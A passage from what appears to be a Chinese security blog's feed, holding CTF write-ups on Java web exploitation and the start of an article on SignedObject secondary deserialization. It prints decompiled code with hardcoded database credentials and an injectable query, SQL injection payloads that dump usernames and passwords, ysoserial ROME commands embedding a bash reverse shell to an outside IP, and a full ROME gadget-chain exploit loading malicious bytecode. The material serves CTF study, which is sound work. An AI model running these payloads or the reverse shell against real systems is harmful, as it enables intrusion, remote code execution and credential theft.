class="hljs-built_in">this</span>.isPK = isPK;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getType</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.type;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setType</span><span class="hljs-params">(String type)</span> &#123;<br>        <span class="hljs-built_in">this</span>.type = type;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getDef</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.def;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setDef</span><span class="hljs-params">(String def)</span> &#123;<br>        <span class="hljs-built_in">this</span>.def = def;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getIsNull</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.isNull;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setIsNull</span><span class="hljs-params">(String isNull)</span> &#123;<br>        <span class="hljs-built_in">this</span>.isNull = isNull;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getIsAuto</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.isAuto;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setIsAuto</span><span class="hljs-params">(String isAuto)</span> &#123;<br>        <span class="hljs-built_in">this</span>.isAuto = isAuto;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getRemark</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.remark;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setRemark</span><span class="hljs-params">(String remark)</span> &#123;<br>        <span class="hljs-built_in">this</span>.remark = remark;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getSize</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.size;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setSize</span><span class="hljs-params">(String size)</span> &#123;<br>        <span class="hljs-built_in">this</span>.size = size;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Row</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Row</span><span class="hljs-params">(String name, String type, String def, String isNull, String isAuto, String remark, String isPK, String size)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.type = type;<br>        <span class="hljs-built_in">this</span>.def = def;<br>        <span class="hljs-built_in">this</span>.isNull = isNull;<br>        <span class="hljs-built_in">this</span>.isAuto = isAuto;<br>        <span class="hljs-built_in">this</span>.remark = remark;<br>        <span class="hljs-built_in">this</span>.isPK = isPK;<br>        <span class="hljs-built_in">this</span>.size = size;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-comment">// Table.class</span><br>一样的，也是一个构造方法和属性的setter/getter方法<br><span class="hljs-keyword">package</span> cn.abc.core.sqldict;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Table</span> &#123;<br>    String tableName;<br>    String tableDescribe;<br>    List&lt;Row&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getTableDescribe</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.tableDescribe;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setTableDescribe</span><span class="hljs-params">(String tableDescribe)</span> &#123;<br>        <span class="hljs-built_in">this</span>.tableDescribe = tableDescribe;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getTableName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.tableName;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setTableName</span><span class="hljs-params">(String tableName)</span> &#123;<br>        <span class="hljs-built_in">this</span>.tableName = tableName;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> List&lt;Row&gt; <span class="hljs-title function_">getList</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.list;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setList</span><span class="hljs-params">(List&lt;Row&gt; list)</span> &#123;<br>        <span class="hljs-built_in">this</span>.list = list;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-comment">// SqlDict.class</span><br>实现了一个数据库查询功能，默认用户名和密码为：root/abc@<span class="hljs-number">12345</span>，还实现了一个获取表中数据的方法，感觉像是有sql注入<br><span class="hljs-keyword">package</span> cn.abc.core.sqldict;<br><br><span class="hljs-keyword">import</span> java.sql.Connection;<br><span class="hljs-keyword">import</span> java.sql.DatabaseMetaData;<br><span class="hljs-keyword">import</span> java.sql.DriverManager;<br><span class="hljs-keyword">import</span> java.sql.ResultSet;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><span class="hljs-keyword">import</span> java.sql.Statement;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SqlDict</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Connection <span class="hljs-title function_">getConnection</span><span class="hljs-params">(String dbName, String user, String pass)</span> &#123;<br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            Class.forName(<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>);<br>            <span class="hljs-keyword">if</span> (dbName != <span class="hljs-literal">null</span> &amp;&amp; !dbName.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>                dbName = <span class="hljs-string">&quot;jdbc:mysql://mysqldbserver:3306/&quot;</span> + dbName;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                dbName = <span class="hljs-string">&quot;jdbc:mysql://mysqldbserver:3306/myapp&quot;</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (user == <span class="hljs-literal">null</span> || dbName.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>                user = <span class="hljs-string">&quot;root&quot;</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (pass == <span class="hljs-literal">null</span> || dbName.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>                pass = <span class="hljs-string">&quot;abc@12345&quot;</span>;<br>            &#125;<br><br>            conn = DriverManager.getConnection(dbName, user, pass);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var5) &#123;<br>            var5.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (SQLException var6) &#123;<br>            var6.printStackTrace();<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> conn;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List&lt;Table&gt; <span class="hljs-title function_">getTableData</span><span class="hljs-params">(String dbName, String user, String pass)</span> &#123;<br>        List&lt;Table&gt; Tables = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> getConnection(dbName, user, pass);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">TableName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Statement</span> <span class="hljs-variable">stmt</span> <span class="hljs-operator">=</span> conn.createStatement();<br>            <span class="hljs-type">DatabaseMetaData</span> <span class="hljs-variable">metaData</span> <span class="hljs-operator">=</span> conn.getMetaData();<br>            <span class="hljs-type">ResultSet</span> <span class="hljs-variable">tableNames</span> <span class="hljs-operator">=</span> metaData.getTables((String)<span class="hljs-literal">null</span>, (String)<span class="hljs-literal">null</span>, (String)<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;TABLE&quot;</span>&#125;);<br><br>            <span class="hljs-keyword">while</span>(tableNames.next()) &#123;<br>                TableName = tableNames.getString(<span class="hljs-number">3</span>);<br>                <span class="hljs-type">Table</span> <span class="hljs-variable">table</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Table</span>();<br>                <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = &#x27;&quot;</span> + dbName + <span class="hljs-string">&quot;&#x27; and table_name=&#x27;&quot;</span> + TableName + <span class="hljs-string">&quot;&#x27;;&quot;</span>;<br>                <span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> stmt.executeQuery(sql);<br><br>                <span class="hljs-keyword">while</span>(rs.next()) &#123;<br>                    table.setTableDescribe(rs.getString(<span class="hljs-string">&quot;TABLE_COMMENT&quot;</span>));<br>                &#125;<br><br>                table.setTableName(TableName);<br>                <span class="hljs-type">ResultSet</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> metaData.getColumns(conn.getCatalog(), (String)<span class="hljs-literal">null</span>, TableName, <span class="hljs-string">&quot;&quot;</span>);<br>                <span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs2</span> <span class="hljs-operator">=</span> metaData.getPrimaryKeys(conn.getCatalog(), (String)<span class="hljs-literal">null</span>, TableName);<br><br>                String PK;<br>                <span class="hljs-keyword">for</span>(PK = <span class="hljs-string">&quot;&quot;</span>; rs2.next(); PK = rs2.getString(<span class="hljs-number">4</span>)) &#123;<br>                &#125;<br><br>                <span class="hljs-keyword">while</span>(data.next()) &#123;<br>                    <span class="hljs-type">Row</span> <span class="hljs-variable">row</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Row</span>(data.getString(<span class="hljs-string">&quot;COLUMN_NAME&quot;</span>), data.getString(<span class="hljs-string">&quot;TYPE_NAME&quot;</span>), data.getString(<span class="hljs-string">&quot;COLUMN_DEF&quot;</span>), data.getString(<span class="hljs-string">&quot;NULLABLE&quot;</span>).equals(<span class="hljs-string">&quot;1&quot;</span>) ? <span class="hljs-string">&quot;YES&quot;</span> : <span class="hljs-string">&quot;NO&quot;</span>, data.getString(<span class="hljs-string">&quot;IS_AUTOINCREMENT&quot;</span>), data.getString(<span class="hljs-string">&quot;REMARKS&quot;</span>), data.getString(<span class="hljs-string">&quot;COLUMN_NAME&quot;</span>).equals(PK) ? <span class="hljs-string">&quot;true&quot;</span> : <span class="hljs-literal">null</span>, data.getString(<span class="hljs-string">&quot;COLUMN_SIZE&quot;</span>));<br>                    table.list.add(row);<br>                &#125;<br><br>                Tables.add(table);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (SQLException var16) &#123;<br>            var16.printStackTrace();<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> Tables;<br>    &#125;<br>&#125;<br><br><br><br><br><br><br><br><br><br></code></pre></td></tr></table></figure><p>从这条语句可以很明显看出存在 sql</p><p>String sql &#x3D; “Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema &#x3D; ‘“ + dbName + “‘ and table_name&#x3D;’” + TableName + “‘;”;</p><p>但是直接访问的时候发现权限不足</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291622126.png" alt="image">​</p><p>但在源码在上面，可以发现在 Test.class 中可以看到有一个 swagger 的 ui，所以可以去访问一下这个 swagger</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291622328.png" alt="image">​</p><p>那么思路就很明确了，通过 swagger 的调试 sql 的功能来进行注入</p><p>然后这里可以知道写在后面的参数是不重要的(前提是满足 jdbc 的协议)</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291622771.png" alt="image">​</p><p>所以通过 myapp?a&#x3D;1’ 来进行闭合</p><p>最后的数据库查询语句为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql">jdbc:mysql:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost:<span class="hljs-number">3306</span><span class="hljs-operator">/</span>myapp?a<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1#</span><br><span class="hljs-string">Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = &#x27;</span>myapp?a<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1#</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 查询账号密码</span><br><span class="hljs-string"></span><br><span class="hljs-string">dbName=myapp#&#x27;</span><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(column_name)<span class="hljs-keyword">from</span>(information_schema.columns)<span class="hljs-keyword">where</span>(table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;user&#x27;</span>)<span class="hljs-keyword">and</span>(table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;myapp&#x27;</span>)#<br>dbName<span class="hljs-operator">=</span>myapp#<span class="hljs-string">&#x27;union select group_concat(name)from(user)#</span><br><span class="hljs-string">dbName=myapp#&#x27;</span><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(pwd)<span class="hljs-keyword">from</span>(<span class="hljs-keyword">user</span>)#<br><br><br></code></pre></td></tr></table></figure><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291622052.png" alt="image">​</p><p>得到 admin&#x2F;admin@Rrrr_ctf_asde</p><p>刚好在 swagger 上看到一个登录调试界面 通过账号密码登录成功后返回一串 base64</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291622324.png" alt="image">​</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291622668.png" alt="image">​</p><p>看到 data 数据以 <code>rO0AB</code>​ 开头，base64-&gt;hex-&gt; 序列化分析</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291622078.png" alt="image">​</p><p>确定了这是一个序列化的 hex 之后，现在回想起来 swagger 上有一个 current 的验证，貌似是验证某个值的，尝试吧返回的 Bearer 传入</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291622484.png" alt="image">​</p><p>发现应该是吧这个序列化的值进行反序列化，那么这里就是一个反序列化的点了，</p><p><span style="font-weight: bold;" data-type="strong">Spring 中有 Rome 环境，使用 Rome 链</span></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial.jar ROME <span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzQ3LjEwOC4yMDkuNi80NDQ0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> &gt; 1.bin<br>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar ROME <span class="hljs-string">&quot;bash -i &gt;&amp;/dev/tcp/47.108.209.6/4444 0&gt;&amp;1&quot;</span> | <span class="hljs-built_in">base64</span> -w 0<br>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar  ROME <span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzQ3LjEwOC4yMDkuN i80NDQ0IDA+JjE=|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> | <span class="hljs-built_in">base64</span> -w 0 &gt; 1.bin<br></code></pre></td></tr></table></figure><p>‍</p><p>‍</p><h3 id="NewStarCTF-Rome"><a href="#NewStarCTF-Rome" class="headerlink" title="NewStarCTF [Rome]"></a>NewStarCTF [Rome]</h3><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291622782.png" alt="image">​</p><p>base64解码直接反序列化，看看依赖有ROME也有jackson</p><p>‍</p><h4 id="jackson"><a href="#jackson" class="headerlink" title="jackson"></a>jackson</h4><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291622031.png" alt="image">​</p><p>符合漏洞版本直接打jackson反序列化就行</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291622252.png" alt="image">​</p><p>‍</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291622755.png" alt="image">​</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291622181.png" alt="image">​</p><p>‍</p><h4 id="rome"><a href="#rome" class="headerlink" title="rome"></a>rome</h4><p>直接打rome链即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ROME;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Rome</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object</span><br><span class="hljs-params">            value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span>  <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">// 生成包含恶意类字节码的 TemplatesImpl 类</span><br>        <span class="hljs-type">byte</span>[] payloads = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Security-Testing\\Java-Sec\\Java-Sec-Payload\\target\\classes\\Evail_Class\\Calc_Ab.class&quot;</span>));<br><br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;payloads&#125;);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;zjacky&quot;</span>);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-comment">// 使用 TemplatesImpl 初始化被包装类，使其 ToStringBean 也使用 TemplatesImpl 初始化</span><br>        <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">delegate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(Templates.class, templates);<br><br><br>        <span class="hljs-comment">// 使用 ObjectBean 封装这个类，使其在调用 hashCode 时会调用 ObjectBean 的 toString</span><br>        <span class="hljs-comment">// 先封装一个无害的类</span><br>        <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(ObjectBean.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(String.class, <span class="hljs-string">&quot;zjacky&quot;</span>));<br><br>        <span class="hljs-comment">// 放入 Map 中</span><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(root, <span class="hljs-string">&quot;zjacky&quot;</span>);<br>        map.put(<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br><br>        <span class="hljs-comment">// put 到 map 之后再反射写进去，避免触发漏洞</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> ObjectBean.class.getDeclaredField(<span class="hljs-string">&quot;_equalsBean&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(root, <span class="hljs-keyword">new</span> <span class="hljs-title class_">EqualsBean</span>(ObjectBean.class, delegate));<br><br>        serialize(map);<br><span class="hljs-comment">//        unserialize(&quot;ser.bin&quot;);</span><br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>base64传入即可</p><p>‍</p><p>工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar y4-yso.jar ROME <span class="hljs-string">&quot;calc&quot;</span> | <span class="hljs-built_in">base64</span> -w 0 &gt; 1.txt<br></code></pre></td></tr></table></figure><p>‍</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291622425.png" alt="image">​</p><p>‍</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java安全 - 浅谈二次反序列化</title>
    <link href="/post/java-security-talking-for-secondary-desequentization-z1daqqv.html"/>
    <url>/post/java-security-talking-for-secondary-desequentization-z1daqqv.html</url>
    
    <content type="html"><![CDATA[<h1 id="Java安全-浅谈二次反序列化"><a href="#Java安全-浅谈二次反序列化" class="headerlink" title="Java安全 - 浅谈二次反序列化"></a>Java安全 - 浅谈二次反序列化</h1><p>‍</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本篇文章首发在先知社区(为先知打Call) 作者Zjacky(本人) 先知社区名称: <code>Zjacky</code> 原文链接为<a href="https://xz.aliyun.com/t/13900">https://xz.aliyun.com/t/13900</a></p><p>在打反序列化的时候会经常存在JNDI不出网的情况下，无论是ROME链的恶意类加载还是Hessian的拼接起来的链子，都会遇到不出网的情况，那么不出网的情况下，应该怎么打呢？</p><p>‍</p><p>‍</p><h1 id="SignedObject二次反序列化"><a href="#SignedObject二次反序列化" class="headerlink" title="SignedObject二次反序列化"></a>SignedObject二次反序列化</h1><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>它是<code>java.security</code>​下一个用于创建真实运行时对象的类，更具体地说，<code>SignedObject</code>​包含另一个<code>Serializable</code>​对象。</p><p>‍</p><p>‍</p><h3 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>‍</p><p>利用链</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">SignedObject#getObject()</span> <span class="hljs-string">-&gt;</span> <span class="hljs-string">x.readObject()</span><br></code></pre></td></tr></table></figure><p>‍</p><p>‍</p><p>发现getObject()方法中还进行了一次readObject()反序列化</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124419.png" alt="image">​</p><p>‍</p><p>反序列化的内容也是可控，去看下他的构造方法，将传入的对象进行序列化给b 并将字节数组存储到content中</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124892.png" alt="image">​</p><p>‍</p><p>一个小型demo来传入恶意对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">kpg</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>kpg.initialize(<span class="hljs-number">1024</span>);<br><span class="hljs-type">KeyPair</span> <span class="hljs-variable">kp</span> <span class="hljs-operator">=</span> kpg.generateKeyPair();<br><span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(恶意对象 用于第二次反序列化, kp.getPrivate(), Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>));<br></code></pre></td></tr></table></figure><p>‍</p><p>那么现在我先手动调用他的getObject()方法并且传入一个可以进行反序列化的对象(随便拉了个CC3就行)</p><figure class="highlight 